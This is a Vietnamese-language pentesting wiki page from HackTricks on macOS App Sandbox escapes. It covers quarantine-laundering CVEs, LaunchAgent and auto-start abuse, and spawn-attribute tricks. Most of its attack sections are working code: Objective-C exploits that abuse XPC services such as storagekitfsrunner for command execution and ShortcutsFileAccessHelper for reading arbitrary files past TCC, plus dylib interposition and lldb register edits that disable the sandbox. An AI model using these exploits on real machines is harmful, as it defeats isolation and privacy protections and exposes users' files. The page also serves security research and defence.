# Debug & Bypass macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Quy trình tải Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Hình ảnh từ <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Trong hình trên, có thể thấy **Sandbox được tải như thế nào** khi chạy một ứng dụng có entitlement **`com.apple.security.app-sandbox`**.

Compiler sẽ liên kết `/usr/lib/libSystem.B.dylib` với binary.

Sau đó, **`libSystem.B`** gọi một số hàm cho đến khi **`xpc_pipe_routine`** gửi entitlements của ứng dụng đến **`securityd`**. Securityd kiểm tra xem process có nên bị cách ly trong Sandbox hay không và, nếu có, sẽ cách ly process đó.\
Cuối cùng, Sandbox được kích hoạt bằng lời gọi **`__sandbox_ms`**, hàm này gọi **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Các cách Bypass khả thi

### Bypass thuộc tính quarantine

**Các file do process trong Sandbox tạo ra** được gắn **thuộc tính quarantine** để ngăn Sandbox escape: nếu bạn thả một ứng dụng mới vào rồi cố chạy nó, cờ quarantine sẽ chặn ứng dụng. Vì vậy, **nếu bạn có thể thả một file hoặc thư mục *không có* thuộc tính quarantine, bạn có thể thoát khỏi App Sandbox** — chỉ cần thả một bundle `.app` rồi khởi chạy bằng `open`, vì process mới được khởi chạy dưới LaunchServices chứ không phải trong Sandbox của bạn.

Cách đáng tin cậy để **thả file không có quarantine** là yêu cầu **một process khác tạo file đó giúp bạn**. Như Mickey Jin đã ghi lại trong [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), **App Sandbox** gắn quarantine vào các file được thả, nhưng **các dịch vụ XPC chạy dưới Service Sandbox thì không**. Do đó, có thể dùng một số dịch vụ XPC không cần xác thực làm primitive để "rửa quarantine":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) và **CVE-2023-32414** (`ArchiveService`): giải nén archive do ứng dụng trong Sandbox cung cấp vào một vị trí tùy chọn **mà không truyền xattr quarantine sang nội dung được giải nén**.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): lỗi path traversal trong `submitSignpostDataWithConfig:` cho phép tạo **các thư mục tùy ý không có quarantine**, đủ để dựng toàn bộ cấu trúc bundle `.app` bên ngoài container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): gắn một DMG có quarantine **mà không gắn quarantine vào thiết bị được tạo ra**, nhờ đó có thể khởi chạy các ứng dụng trên volume đã mount.

> [!TIP]
> Quá trình giải nén thường **loại bỏ bit quyền thực thi**. Cách khắc phục được dùng trong CVE-2023-27944 là đặt một **symlink** trỏ đến binary hệ thống đã ký có sẵn (ví dụ: `/System/Library/CoreServices/Automator Application Stub`) làm executable chính của bundle, nhờ đó vẫn có thể khởi chạy mà không cần `+x` trên file được thả.

> [!CAUTION]
> Cách này hoạt động vì việc kiểm tra dựa trên **cờ của mục được khởi chạy**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, và chỉ sau đó *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Bundle được khởi chạy không có cờ đồng nghĩa với việc không qua Gatekeeper — đây chính xác là primitive mà các CVE bên trên cung cấp.<sup>[[5]](#references)</sup>
>
> Lưu ý rằng nếu một bundle `.app` đã được cấp quyền chạy (có xattr quarantine với cờ "authorized to run"), bạn cũng có thể lạm dụng nó... tuy nhiên, lúc này bạn không thể ghi vào bên trong bundle **`.app`** trừ khi có một số quyền TCC đặc quyền (mà bạn sẽ không có trong Sandbox).

### Lạm dụng chức năng Open

Trong [**các ví dụ cuối về Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), có thể thấy cách lạm dụng chức năng CLI **`open`** để bypass Sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Ngay cả khi một ứng dụng **được thiết kế để chạy trong Sandbox** (`com.apple.security.app-sandbox`), vẫn có thể bypass Sandbox nếu ứng dụng được **chạy từ LaunchAgent** (ví dụ: `~/Library/LaunchAgents`).\
Như được giải thích trong [**bài viết này**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), nếu muốn duy trì persistence bằng một ứng dụng chạy trong Sandbox, bạn có thể thiết lập để ứng dụng tự động chạy dưới dạng LaunchAgent và có thể inject mã độc thông qua các biến môi trường DyLib.<sup>[[6]](#references)</sup>

### Lạm dụng các vị trí tự khởi chạy

Nếu một process trong Sandbox có thể **ghi** vào nơi mà **một ứng dụng không chạy trong Sandbox sẽ chạy binary sau đó**, nó có thể **thoát Sandbox chỉ bằng cách đặt** binary ở đó. `~/Library/LaunchAgents` hoặc `/System/Library/LaunchDaemons` là những ví dụ điển hình về các vị trí như vậy.

Trong trường hợp này, bạn thậm chí có thể cần **2 bước**: khiến một process có **Sandbox ít hạn chế hơn** (`file-read*`, `file-write*`) thực thi mã của bạn; mã này sẽ ghi vào một vị trí mà sau đó sẽ được **thực thi ngoài Sandbox**.

Xem trang này về **các vị trí tự khởi chạy**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Lạm dụng các process khác

Nếu từ process trong Sandbox đó, bạn có thể **xâm nhập các process khác** đang chạy trong Sandbox ít hạn chế hơn (hoặc không có Sandbox), bạn sẽ có thể thoát sang các Sandbox của chúng:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Các dịch vụ Mach của hệ thống và người dùng có thể sử dụng

Sandbox cũng cho phép giao tiếp với một số **dịch vụ Mach** thông qua XPC được định nghĩa trong profile `application.sb`. Nếu có thể **lạm dụng** một trong các dịch vụ này, bạn có thể **thoát Sandbox**.

Như được chỉ ra trong [bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), thông tin về các dịch vụ Mach được lưu trong `/System/Library/xpc/launchd.plist`. Có thể tìm tất cả dịch vụ Mach của hệ thống và người dùng bằng cách tìm `<string>System</string>` và `<string>User</string>` trong file đó.<sup>[[4]](#references)</sup>

Ngoài ra, có thể kiểm tra xem một ứng dụng chạy trong Sandbox có thể sử dụng dịch vụ Mach hay không bằng cách gọi `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Các Mach services khả dụng trong PID

Các Mach services này lần đầu bị khai thác để [thoát khỏi sandbox trong bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Vào thời điểm đó, **tất cả XPC services mà** một ứng dụng và framework của nó cần đều hiển thị trong miền PID của ứng dụng (đây là các Mach Services có `ServiceType` là `Application`).<sup>[[4]](#references)</sup>

Để **kết nối với một XPC service trong PID Domain**, chỉ cần đăng ký service đó trong ứng dụng bằng một dòng như sau:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Hơn nữa, có thể tìm tất cả các dịch vụ Mach **Application** bằng cách tìm `<string>Application</string>` bên trong `System/Library/xpc/launchd.plist`.

Một cách khác để tìm các dịch vụ xpc hợp lệ là kiểm tra những dịch vụ trong:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Có thể tìm thấy một số ví dụ khai thác kỹ thuật này trong [**bài viết gốc**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), tuy nhiên, sau đây là một số ví dụ tóm tắt.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Dịch vụ này cho phép mọi kết nối XPC bằng cách luôn trả về `YES`, còn phương thức `runTask:arguments:withReply:` thực thi một lệnh tùy ý với các tham số tùy ý.

Cách khai thác “đơn giản như sau”:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

XPC service này cho phép mọi client bằng cách luôn trả về `YES`, và phương thức `createZipAtPath:hourThreshold:withReply:` chấp nhận đường dẫn đến một thư mục rồi nén thư mục đó thành tệp ZIP.

Do đó, có thể tạo cấu trúc thư mục app giả, nén rồi giải nén và thực thi nó để thoát khỏi sandbox, vì các tệp mới sẽ không có thuộc tính quarantine.

Exploit là:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Dịch vụ XPC này cho phép cấp quyền đọc và ghi vào một URL bất kỳ cho client XPC thông qua phương thức `extendAccessToURL:completion:`, phương thức này chấp nhận mọi kết nối. Vì dịch vụ XPC có FDA, có thể lạm dụng các quyền này để bypass hoàn toàn TCC.

Exploit hoạt động như sau:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Biên dịch tĩnh & liên kết động

[**Nghiên cứu này**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) đã phát hiện 2 cách bypass Sandbox. Vì sandbox được áp dụng từ userland khi thư viện **libSystem** được tải. Nếu một binary có thể tránh tải thư viện đó, nó sẽ không bao giờ bị sandbox:<sup>[[2]](#references)</sup>

- Nếu binary được **biên dịch tĩnh hoàn toàn**, nó có thể tránh tải thư viện đó.
- Nếu **binary không cần tải bất kỳ thư viện nào** (vì linker cũng nằm trong libSystem), nó sẽ không cần tải libSystem.

### Shellcodes

Lưu ý rằng **ngay cả shellcodes** trên ARM64 cũng cần được liên kết với `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Các hạn chế không được kế thừa

Như đã giải thích trong **[phần bổ sung của bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, một hạn chế của sandbox như sau:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

có thể bị bypass bằng cách một tiến trình mới thực thi, chẳng hạn:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Tuy nhiên, tất nhiên, process mới này sẽ không kế thừa entitlements hoặc privileges từ process cha.

### Thay thế sandbox được kế thừa bằng spawn attributes (macOS cũ)

Một process con `posix_spawn()` thông thường sẽ kế thừa sandbox của process cha. Trên các bản dựng macOS trước bản vá tháng 2 năm 2026, process cha đang bị sandbox giới hạn có thể thay vào đó truyền một **tên profile tích hợp sẵn** cho MAC policy `Sandbox` thông qua `posix_spawnattr_setmacpolicyinfo_np()`. Khi đó, process con nhận profile này *thay cho* các giới hạn của process cha. Profile tích hợp sẵn `no-network` vẫn cho phép truy cập thư mục home của người dùng, nên một process con như `/bin/bash` có thể thao tác với các file mà process cha App Sandbox không thể truy cập. Điều này khác với [đường đi LaunchServices `open`](#not-inherited-restrictions), trong đó một service riêng khởi chạy process. Xem [MACF policy-specific spawn attributes](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input) để biết đường đi input tổng quát.<sup>[[7]](#references)</sup>

Để kiểm tra ranh giới này trên một **máy chủ macOS bị ảnh hưởng, đã được cô lập**, hãy tạo một canary vô hại trong thư mục home, bên ngoài app container. Chạy cùng một process con từ một process cha đã bị sandbox giới hạn: trước tiên bằng `posix_spawn()` thông thường, sau đó bằng blob Sandbox spawn-attribute chọn `no-network`; so sánh xem process con có thể đọc canary hay không. Đoạn mã sau sử dụng định nghĩa riêng tư `sandbox_spawnattr_t` và các khai báo hàm trong [sample launcher](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) của Siguza. Hãy bổ sung xử lý lỗi thông thường khi tích hợp đoạn mã này vào ứng dụng kiểm thử.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Một lần gọi `posix_spawn()` trả về thành công không chứng minh rằng đã thoát sandbox: hãy kiểm tra **quyền truy cập tệp thực tế của tiến trình con** so với baseline của tiến trình con thông thường. Các hệ thống đã vá sẽ từ chối profile tích hợp sẵn được yêu cầu bởi một caller đã ở trong sandbox, trừ khi caller có entitlement riêng tư `com.apple.private.security.sandbox-spawnattrs`. Đừng xem hành vi lịch sử này là một bypass hiện tại.<sup>[[7]](#references)</sup>

### Entitlements

Lưu ý rằng ngay cả khi một số **hành động** có thể được **sandbox cho phép** nếu ứng dụng có một **entitlement** cụ thể, chẳng hạn như:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Để biết thêm thông tin về **Interposting**, hãy xem:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` để ngăn sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interpose `__mac_syscall` để ngăn Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Gỡ lỗi & bypass Sandbox bằng lldb

Hãy biên dịch một ứng dụng cần được sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Sau đó biên dịch ứng dụng:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> Ứng dụng sẽ cố **đọc** tệp **`~/Desktop/del.txt`**, nhưng **Sandbox sẽ không cho phép**.\
> Hãy tạo một tệp ở đó, vì khi Sandbox được bypass, ứng dụng sẽ có thể đọc tệp đó:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Hãy debug ứng dụng để xem Sandbox được tải khi nào:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Ngay cả khi đã bypass Sandbox, TCC vẫn sẽ hỏi người dùng có muốn cho phép tiến trình đọc các tệp trong thư mục Desktop hay không**

## References

- [1] [Jonathan Levin - Apple Sandbox: Đi sâu hơn vào vũng lầy (slide HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Thoát khỏi Sandbox của Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Đi sâu hơn vào vũng lầy (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Kỷ nguyên mới của các vụ thoát Sandbox trên macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Giải thích: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Bypass macOS TCC bằng Telegram với DyLib Injection (Phần 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Thoát khỏi Apple Sandbox bằng cách khởi chạy một executable](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec nhưng dành cho các profile tích hợp sẵn](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
